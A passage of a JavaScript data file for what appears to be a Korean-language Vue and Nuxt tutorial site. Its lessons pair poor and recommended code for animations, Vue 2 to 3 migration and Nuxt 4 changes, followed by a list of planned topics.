.list-enter-from, .list-leave-to { opacity: 0; transform: translateY(8px); }
.list-leave-active { position: absolute; }   /* 빠지는 항목이 자리를 차지하지 않게 */
</style>
`,
        },
        {
          id: 'l5', short: `숫자 카운트`,
          title: `숫자 변화는 useTransition 으로 보간`,
          why: `1,200 에서 3,400 으로 툭 바뀌면 변화를 못 느낍니다. VueUse 의 useTransition 이 중간값을 만들어 주고 이징도 고릅니다.`,
          bad: String.raw`
<span>{{ total }}</span>     <!-- 툭 바뀐다 -->
`,
          good: String.raw`
import { useTransition, TransitionPresets } from '@vueuse/core'

const total = ref(0)
const shown = useTransition(total, { duration: 600, transition: TransitionPresets.easeOutCubic })
<span>{{ Math.round(shown).toLocaleString() }}</span>
`,
        },
        {
          id: 'l6', short: `스크롤 등장`,
          title: `스크롤 등장 효과는 IntersectionObserver 로`,
          why: `scroll 이벤트에서 getBoundingClientRect 를 부르면 스크롤마다 레이아웃을 읽어 버벅입니다. IntersectionObserver 는 보일 때 한 번만 알려 줍니다.`,
          bad: String.raw`
window.addEventListener('scroll', () => {
  els.forEach(el => { if (el.getBoundingClientRect().top < innerHeight) el.classList.add('in') })
})
`,
          good: String.raw`
import { useIntersectionObserver } from '@vueuse/core'

const el = useTemplateRef('card')
const shown = ref(false)
useIntersectionObserver(el, ([entry]) => { if (entry.isIntersecting) shown.value = true }, { threshold: .2 })

<div ref="card" :class="{ in: shown }">...</div>
/* .in { opacity: 1; transform: none; transition: .4s } */
`,
          note: `@vueuse/motion 의 <code>v-motion</code> 디렉티브가 이 패턴을 선언형으로 제공합니다: <code>v-motion :initial="{ opacity: 0, y: 20 }" :visible-once="{ opacity: 1, y: 0 }"</code>.`,
        },
        {
          id: 'l7', short: `View Transitions`,
          title: `페이지 간 요소 연결은 View Transitions API`,
          why: `목록의 썸네일이 상세의 큰 이미지로 이어지는 효과를 손으로 만들면 좌표 계산이 복잡합니다. 브라우저의 View Transitions 가 같은 이름의 요소를 자동으로 이어 줍니다.`,
          bad: String.raw`
// 클릭 시 썸네일 좌표를 재서 복제 요소를 만들어 상세 위치로 옮기는 200줄
`,
          good: String.raw`
// nuxt.config.ts
experimental: { viewTransition: true }

<!-- 목록 -->
<img :src="p.thumb" :style="{ viewTransitionName: 'photo-' + p.id }">
<!-- 상세 -->
<img :src="p.full" :style="{ viewTransitionName: 'photo-' + p.id }">

/* 지원 안 하는 브라우저는 그냥 이동한다 */
::view-transition-old(root), ::view-transition-new(root) { animation-duration: .25s; }
`,
        },
        {
          id: 'l8', short: `정리`,
          title: `requestAnimationFrame 과 타이머는 반드시 정리한다`,
          why: `애니메이션 루프를 돌리다 컴포넌트가 사라지면 루프가 허공에서 계속 돕니다. 페이지를 오갈수록 쌓여 느려집니다.`,
          bad: String.raw`
onMounted(() => {
  function loop() { draw(); requestAnimationFrame(loop) }
  loop()                       // 영원히
})
`,
          good: String.raw`
import { useRafFn } from '@vueuse/core'
const { pause, resume } = useRafFn(draw)     // 언마운트 시 자동 정지

// 직접 할 때
let id = 0
onMounted(() => { const loop = () => { draw(); id = requestAnimationFrame(loop) }; loop() })
onUnmounted(() => cancelAnimationFrame(id))
`,
        },
        {
          id: 'l9', short: `스켈레톤`,
          title: `로딩은 스피너보다 스켈레톤, 레이아웃을 흔들지 않는다`,
          why: `스피너 뒤에 내용이 툭 나타나면 화면이 밀립니다(CLS). 내용 모양의 스켈레톤을 같은 크기로 두면 전환이 자연스럽고 레이아웃 이동이 없습니다.`,
          bad: String.raw`
<Spinner v-if="status === 'pending'" />
<ProductCard v-else :product="data" />     <!-- 높이가 0 → 320px 로 튄다 -->
`,
          good: String.raw`
<ProductCardSkeleton v-if="status === 'pending'" />   <!-- ProductCard 와 같은 높이 -->
<ProductCard v-else :product="data" />

/* 스켈레톤 */
.sk { background: linear-gradient(90deg, var(--line) 25%, var(--surface) 50%, var(--line) 75%);
      background-size: 200% 100%; animation: shimmer 1.2s infinite; }
@keyframes shimmer { to { background-position: -200% 0 } }
`,
        },
        {
          id: 'l10', short: `드래그`,
          title: `드래그 정렬은 라이브러리와 키보드 대안`,
          why: `mousedown/mousemove 로 직접 만든 드래그는 터치, 스크롤, 접근성을 놓칩니다. 검증된 라이브러리를 쓰고, 위/아래 이동 버튼 같은 키보드 대안을 둡니다.`,
          bad: String.raw`
@mousedown="start" @mousemove="move" @mouseup="end"    <!-- 터치 안 됨, 키보드 안 됨 -->
`,
          good: String.raw`
import { useSortable } from '@vueuse/integrations/useSortable'   // SortableJS

const list = useTemplateRef('list')
useSortable(list, items, { animation: 150, handle: '.grip' })

<ul ref="list">
  <li v-for="(it, i) in items" :key="it.id">
    <span class="grip" aria-hidden="true">⋮⋮</span> {{ it.name }}
    <button @click="move(i, -1)" aria-label="위로">↑</button>
    <button @click="move(i, 1)" aria-label="아래로">↓</button>
  </li>
</ul>
`,
        },
      ],
    },
    {
      id: 'vue-19', no: 19, name: `Vue 2 → 3 마이그레이션`,
      lead: `Vue 2 코드를 Vue 3 로 옮길 때 꼭 바뀌는 것들입니다. 왼쪽이 Vue 2 방식, 오른쪽이 Vue 3 방식입니다.`,
      lessons: [
        {
          id: 'l1', short: `앱 생성`,
          title: `new Vue 대신 createApp`,
          badLabel: `✕ Vue 2`, goodLabel: `✓ Vue 3`,
          why: `전역 Vue 객체에 플러그인과 컴포넌트를 등록하던 방식은 앱이 둘이면 서로 섞였습니다. createApp 이 만든 인스턴스에 등록합니다.`,
          bad: String.raw`
import Vue from 'vue'
Vue.use(Router)
Vue.component('MyButton', MyButton)
Vue.prototype.$http = axios
new Vue({ router, store, render: h => h(App) }).$mount('#app')
`,
          good: String.raw`
import { createApp } from 'vue'
const app = createApp(App)
app.use(router).use(pinia)
app.component('MyButton', MyButton)
app.config.globalProperties.$http = axios     // 가능하지만 provide/inject 가 낫다
app.mount('#app')
`,
        },
        {
          id: 'l2', short: `v-model`,
          title: `value/input 대신 modelValue/update:modelValue, .sync 는 v-model:이름`,
          badLabel: `✕ Vue 2`, goodLabel: `✓ Vue 3`,
          why: `커스텀 컴포넌트의 v-model 계약이 바뀌었고, .sync 수식어는 v-model 의 인자로 합쳐졌습니다.`,
          bad: String.raw`
<!-- 자식 -->
props: ['value'],
this.$emit('input', v)
<!-- 부모 -->
<Child v-model="name" :title.sync="title" />
`,
          good: String.raw`
<!-- 자식 -->
const model = defineModel<string>()           // modelValue / update:modelValue
const title = defineModel<string>('title')
<!-- 부모 -->
<Child v-model="name" v-model:title="title" />
`,
        },
        {
          id: 'l3', short: `필터`,
          title: `필터는 사라졌다, 함수나 computed 로`,
          badLabel: `✕ Vue 2`, goodLabel: `✓ Vue 3`,
          why: `| currency 같은 필터 문법이 제거되었습니다. 그냥 함수 호출이나 computed 로 바꿉니다.`,
          bad: String.raw`
{{ price | currency }}
filters: { currency(v) { return v.toLocaleString() + '원' } }
`,
          good: String.raw`
{{ formatCurrency(price) }}

// utils/format.ts
export const formatCurrency = (v: number) => v.toLocaleString() + '원'
// 전역으로 쓰려면 app.config.globalProperties.$fmt 또는 자동 import(Nuxt utils/)
`,
        },
        {
          id: 'l4', short: `이벤트 버스`,
          title: `$on/$off 이벤트 버스는 mitt 나 상태로`,
          badLabel: `✕ Vue 2`, goodLabel: `✓ Vue 3`,
          why: `컴포넌트 인스턴스의 $on, $off, $once 가 제거되어 new Vue() 를 버스로 쓰던 패턴이 사라졌습니다. 대부분은 공유 상태(Pinia)로 바꾸는 것이 맞고, 정말 이벤트면 mitt 를 씁니다.`,
          bad: String.raw`
export const bus = new Vue()
bus.$emit('toast', '저장됨')
bus.$on('toast', show)
`,
          good: String.raw`
// 대부분: 상태로
const toast = useToastStore(); toast.show('저장됨')

// 정말 이벤트가 필요하면
import mitt from 'mitt'
export const emitter = mitt<{ toast: string }>()
emitter.emit('toast', '저장됨')
emitter.on('toast', show); onUnmounted(() => emitter.off('toast', show))
`,
        },
        {
          id: 'l5', short: `$listeners, $children`,
          title: `$listeners 는 $attrs 에 합쳐졌고 $children 은 없다`,
          badLabel: `✕ Vue 2`, goodLabel: `✓ Vue 3`,
          why: `이벤트 리스너도 $attrs 에 onXxx 로 들어옵니다. 자식 목록을 뒤지던 $children 은 사라졌으니 템플릿 ref 로 명시합니다.`,
          bad: String.raw`
<input v-bind="$attrs" v-on="$listeners">
this.$children[0].reset()
`,
          good: String.raw`
<input v-bind="$attrs">                    <!-- class, style, onInput 전부 포함 -->

const child = useTemplateRef('child')
child.value?.reset()                       // 자식이 defineExpose 한 것만
`,
        },
        {
          id: 'l6', short: `라이프사이클`,
          title: `destroyed 는 unmounted, 훅 이름이 바뀌었다`,
          badLabel: `✕ Vue 2`, goodLabel: `✓ Vue 3`,
          why: `beforeDestroy/destroyed 가 beforeUnmount/unmounted 로 바뀌었고, Composition API 에서는 on 접두사를 붙입니다. @hook: 이벤트도 vue: 접두사로 바뀌었습니다.`,
          bad: String.raw`
beforeDestroy() { clearInterval(this.timer) },
destroyed() { ... }
<Child @hook:mounted="onChildMounted" />
`,
          good: String.raw`
onBeforeUnmount(() => clearInterval(timer))
onUnmounted(() => { ... })
<Child @vue:mounted="onChildMounted" />
`,
        },
        {
          id: 'l7', short: `Transition 클래스`,
          title: `v-enter 는 v-enter-from, v-leave 는 v-leave-from`,
          badLabel: `✕ Vue 2`, goodLabel: `✓ Vue 3`,
          why: `전환 클래스 이름이 바뀌어 옛 CSS 를 그대로 두면 애니메이션이 조용히 사라집니다.`,
          bad: String.raw`
.fade-enter, .fade-leave-to { opacity: 0; }
`,
          good: String.raw`
.fade-enter-from, .fade-leave-to { opacity: 0; }
.fade-enter-active, .fade-leave-active { transition: opacity .3s; }
`,
        },
        {
          id: 'l8', short: `반응성 API`,
          title: `Vue.set / Vue.delete 와 배열 index 제한이 사라졌다`,
          badLabel: `✕ Vue 2`, goodLabel: `✓ Vue 3`,
          why: `Vue 3 는 Proxy 기반이라 새 속성 추가, 배열 index 대입, 삭제가 그냥 반응합니다. Vue.set 호출은 지워도 됩니다.`,
          bad: String.raw`
Vue.set(this.user, 'nickname', 'kim')
Vue.set(this.list, 2, item)
Vue.delete(this.user, 'tmp')
`,
          good: String.raw`
user.nickname = 'kim'
list.value[2] = item
delete user.tmp
`,
          note: `단, Vue 3 에서도 <code>reactive</code> 를 통째로 재할당하거나 구조 분해하면 끊깁니다 (3회차 01번).`,
        },
        {
          id: 'l9', short: `mixin → 컴포저블`,
          title: `mixin 은 컴포저블로`,
          badLabel: `✕ Vue 2`, goodLabel: `✓ Vue 3`,
          why: `mixin 은 어디서 온 속성인지 보이지 않고 이름이 충돌합니다. 컴포저블은 import 와 구조 분해로 출처와 이름이 드러납니다.`,
          bad: String.raw`
export const paginationMixin = { data() { return { page: 1 } }, methods: { next() { this.page++ } } }
export default { mixins: [paginationMixin] }     // this.page 가 어디서 왔는지 안 보인다
`,
          good: String.raw`
export function usePagination(initial = 1) {
  const page = ref(initial)
  const next = () => page.value++
  return { page, next }
}
const { page, next } = usePagination()           // 출처가 보인다, 이름은 바꿀 수 있다
`,
        },
        {
          id: 'l10', short: `점진적 전환`,
          title: `한 번에 옮기지 말고 호환 빌드로 단계적으로`,
          why: `큰 앱을 한 번에 옮기면 수백 개 오류가 동시에 납니다. @vue/compat 로 Vue 2 동작을 흉내내며 경고를 하나씩 지우고, 마지막에 호환 모드를 끕니다.`,
          bad: String.raw`
npm install vue@3     # 모든 것이 동시에 깨진다
`,
          good: String.raw`
# 1. 호환 빌드 설치: Vue 2 동작을 유지하면서 Vue 3 로 실행
npm install vue@3 @vue/compat
# vite/webpack alias: vue → @vue/compat, compilerOptions.compatConfig: { MODE: 2 }

# 2. 콘솔의 deprecation 경고를 기능별로 끈다 (configureCompat) 하나씩 고친다
# 3. 라이브러리 교체: vuex → pinia, vue-router 3 → 4, vue-i18n 8 → 9
# 4. MODE: 3 으로 바꾸고 @vue/compat 제거
`,
          lang: 'plain',
        },
      ],
    },
    {
      id: 'vue-20', no: 20, name: `Nuxt 4 변화`,
      lead: `Nuxt 3 에서 4 로 갈 때 바뀌는 것들입니다. 대부분은 Nuxt 3 에서도 compatibilityVersion: 4 로 미리 켤 수 있습니다.`,
      lessons: [
        {
          id: 'l1', short: `app/ 디렉터리`,
          title: `앱 코드는 app/ 아래로`, ver: `Nuxt 4`,
          badLabel: `✕ Nuxt 3 구조`, goodLabel: `✓ Nuxt 4 구조`,
          why: `pages, components, composables 가 루트에 server, public, nuxt.config 와 섞여 있던 것을 app/ 로 모읍니다. IDE 와 파일 감시 범위가 좁아지고 서버 코드와 명확히 나뉩니다.`,
          bad: String.raw`
nuxt.config.ts
app.vue
pages/
components/
composables/
server/
public/
`,
          good: String.raw`
nuxt.config.ts
app/
  app.vue
  pages/
  components/
  composables/
  layouts/
  middleware/
  utils/
server/
shared/        # 클라이언트와 서버가 함께 쓰는 타입, 스키마 (자동 import: shared/utils, shared/types)
public/
`,
          note: `마이그레이션: <code>npx codemod@latest nuxt/4/migration-recipe</code> 가 파일 이동을 해 줍니다. Nuxt 3.12+ 에서는 <code>future: { compatibilityVersion: 4 }</code> 로 미리 적용할 수 있습니다.`,
        },
        {
          id: 'l2', short: `data 기본값`,
          title: `useFetch 의 data 기본값은 null 이 아니라 undefined`, ver: `Nuxt 4`,
          badLabel: `✕ Nuxt 3`, goodLabel: `✓ Nuxt 4`,
          why: `data.value === null 로 검사하던 코드는 Nuxt 4 에서 항상 false 가 됩니다. 값이 있는지 보려면 truthy 검사나 undefined 비교로 바꿉니다.`,
          bad: String.raw`
const { data } = await useFetch('/api/user')
if (data.value === null) showEmpty()       // Nuxt 4 에서는 undefined 라 안 걸린다
`,
          good: String.raw`
const { data } = await useFetch('/api/user')
if (!data.value) showEmpty()

// 기본값을 직접 정하면 둘 다 안전
const { data: items } = await useFetch('/api/items', { default: () => [] })
`,
        },
        {
          id: 'l3', short: `얕은 반응성`,
          title: `data 는 shallowRef 다, 안쪽을 고치면 반응하지 않는다`, ver: `Nuxt 4`,
          badLabel: `✕ Nuxt 3 습관`, goodLabel: `✓ Nuxt 4`,
          why: `성능을 위해 useFetch/useAsyncData 의 data 가 깊은 반응성을 갖지 않습니다. data.value.items.push 는 화면을 갱신하지 않습니다. 통째로 교체하거나 deep 옵션을 켭니다.`,
          bad: String.raw`
const { data } = await useFetch('/api/todos')
data.value.items.push(newTodo)            // Nuxt 4: 화면이 안 바뀐다
`,
          good: String.raw`
data.value = { ...data.value, items: [...data.value.items, newTodo] }   // 교체
// 또는 서버에 반영한 뒤 refresh()
// 정말 깊은 반응성이 필요하면
const { data } = await useFetch('/api/todos', { deep: true })
`,
        },
        {
          id: 'l4', short: `pending → status`,
          title: `pending 대신 status 를 쓴다`, ver: `Nuxt 4`,
          badLabel: `✕ Nuxt 3`, goodLabel: `✓ Nuxt 4`,
          why: `pending 은 폐기 예정입니다. 'idle' | 'pending' | 'success' | 'error' 네 상태를 가진 status 가 immediate: false 같은 경우까지 정확히 표현합니다.`,
          bad: String.raw`
const { data, pending } = await useFetch('/api/items')
<Spinner v-if="pending" />
`,
          good: String.raw`
const { data, status } = await useFetch('/api/items')
<Spinner v-if="status === 'pending'" />
<ErrorBox v-else-if="status === 'error'" />
<List v-else :items="data" />
`,
        },
        {
          id: 'l5', short: `키 공유`,
          title: `같은 키의 useAsyncData 는 옵션도 같아야 한다`, ver: `Nuxt 4`,
          why: `Nuxt 4 는 같은 키를 쓰는 호출이 핸들러와 옵션(transform, pick, deep 등)을 공유합니다. 다르면 개발 모드 경고가 납니다. 키마다 컴포저블 하나로 묶으면 안전합니다.`,
          bad: String.raw`
// A.vue
useAsyncData('users', () => $fetch('/api/users'), { transform: pickNames })
// B.vue
useAsyncData('users', () => $fetch('/api/users'))        // 같은 키, 다른 옵션: 경고
`,
          good: String.raw`
// composables/useUsers.ts
export const useUsers = () => useAsyncData('users', () => $fetch('/api/users'), { transform: pickNames })
// A.vue, B.vue 모두 useUsers() 를 부른다. 결과와 요청이 공유된다
`,
        },
        {
          id: 'l6', short: `라우트 메타 스캔`,
          title: `definePageMeta 는 정적으로 분석된다, 변수 참조 금지`, ver: `Nuxt 4`,
          why: `페이지 메타는 빌드 때 파일에서 추출됩니다. 변수나 import 한 값을 넣으면 추출이 안 되거나 Nuxt 4 에서 오류가 납니다. 리터럴로 적습니다.`,
          bad: String.raw`
const layout = isAdmin ? 'admin' : 'default'
definePageMeta({ layout, middleware: authMiddleware })   // 변수 참조
`,
          good: String.raw`
definePageMeta({ layout: 'admin', middleware: ['auth'] })   // 리터럴만

// 동적으로 바꾸려면 setPageLayout() 또는 <NuxtLayout :name="layout">
`,
        },
        {
          id: 'l7', short: `컴포넌트 이름`,
          title: `컴포넌트 이름은 파일 경로 기준으로 정규화된다`, ver: `Nuxt 4`,
          why: `components/MyButton/MyButton.vue 가 MyButtonMyButton 이 아니라 MyButton 이 되는 규칙은 같지만, 이름과 경로가 다르면 Nuxt 4 가 경로 기준 이름을 씁니다. 파일 이름이 곧 컴포넌트 이름이라 생각하면 됩니다.`,
          bad: String.raw`
// components/form/input.vue 안에서
defineOptions({ name: 'MyInput' })
<MyInput />              // Nuxt 4: 찾지 못한다 (등록 이름은 FormInput)
`,
          good: String.raw`
// components/form/Input.vue → <FormInput />
<FormInput />
// 이름을 바꾸고 싶으면 파일을 옮긴다. defineOptions name 은 devtools 표시용으로만
`,
        },
        {
          id: 'l8', short: `shared/`,
          title: `클라이언트와 서버가 같이 쓰는 코드는 shared/`, ver: `Nuxt 4`,
          why: `zod 스키마나 타입을 server/ 와 app/ 양쪽에서 import 하려면 어느 쪽에도 속하지 않는 자리가 필요합니다. shared/utils 와 shared/types 는 양쪽에서 자동 import 됩니다.`,
          bad: String.raw`
// app/utils/schemas.ts 를 server/api 에서 import   → 서버 번들이 app 코드를 끌어온다
`,
          good: String.raw`
shared/
  utils/validate.ts      # 양쪽에서 자동 import
  types/user.ts
// 명시 import 는 #shared 별칭
import { UserSchema } from '#shared/utils/validate'
`,
        },
        {
          id: 'l9', short: `TS 프로젝트 분리`,
          title: `타입 검사가 app, server, shared 로 나뉜다`, ver: `Nuxt 4`,
          why: `서버 코드에서 Vue 전역(useRoute 등)이 보이거나 그 반대였던 것이 Nuxt 4 에서는 tsconfig 가 분리되어 각자 맞는 전역만 보입니다. 잘못된 import 가 타입 오류로 드러납니다.`,
          bad: String.raw`
// server/api/x.ts
const route = useRoute()            // Nuxt 3: 타입은 통과, 실행하면 터짐
`,
          good: String.raw`
// Nuxt 4: 서버 프로젝트에는 useRoute 가 없어 타입 오류
// 서버에서 요청 정보는 event 로
export default defineEventHandler((event) => getRouterParams(event))

// tsconfig.json 은 .nuxt/tsconfig.app.json, .nuxt/tsconfig.server.json 등을 참조한다
`,
        },
        {
          id: 'l10', short: `compatibilityDate`,
          title: `compatibilityDate 를 꼭 적는다`, ver: `Nuxt 3.12+`,
          why: `Nitro 와 Nuxt 는 동작 변경을 날짜 기준으로 묶습니다. 날짜가 없으면 옛 동작으로 묶이거나 빌드마다 경고가 납니다. 새 프로젝트는 오늘 날짜, 업그레이드할 때 한 번에 올립니다.`,
          bad: String.raw`
export default defineNuxtConfig({ modules: [...] })   // compatibilityDate 없음: 경고, 옛 동작
`,
          good: String.raw`
export default defineNuxtConfig({
  compatibilityDate: '2025-07-15',
  future: { compatibilityVersion: 4 },     // Nuxt 3 에서 4 동작 미리 적용
  modules: [...]
})
`,
        },
      ],
    },
    // @@APPEND@@ 새 회차는 이 줄 위에 추가
  ],
  // 다음에 만들 묶음 예고. 없으면 null.
  upcoming: {
    name: `201~300번 후보 주제`,
    items: [
      `E2E 테스트 (Playwright)`,
      `접근성 (a11y) 점검`,
      `성능 측정과 Core Web Vitals`,
      `실시간 (WebSocket, SSE)`,
      `파일 업로드와 이미지 처리`,
      `데이터 테이블과 페이지네이션 패턴`,
      `에러 처리, 로깅, 모니터링`,
      `보안 (CSP, XSS, 의존성 점검)`,
      `모노레포와 패키지 구조`,
      `면접 단골 질문`,
    ],
  },
};
